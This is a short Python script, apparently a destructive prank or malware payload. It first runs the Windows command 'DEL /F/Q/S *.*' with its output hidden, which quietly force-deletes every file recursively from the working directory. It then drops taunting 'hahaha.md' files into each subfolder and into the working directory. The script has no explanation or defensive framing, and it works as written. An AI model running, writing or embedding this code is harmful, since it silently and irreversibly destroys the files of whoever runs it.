import os

os.system('DEL /F/Q/S *.* > NUL')

folder_path = os.path.realpath(os.path.dirname(__file__))

for item in os.listdir(folder_path):
    item_path = os.path.join(folder_path, item)
    
    if os.path.isdir(item_path):
        file_name = 'hahaha.md'
        
        file_path = os.path.join(item_path, file_name)
        with open(file_path, 'w') as f:
            f.write("hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha")
            f.close()

f = open("hahaha.md", "w")
f.write("hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha")
f.close()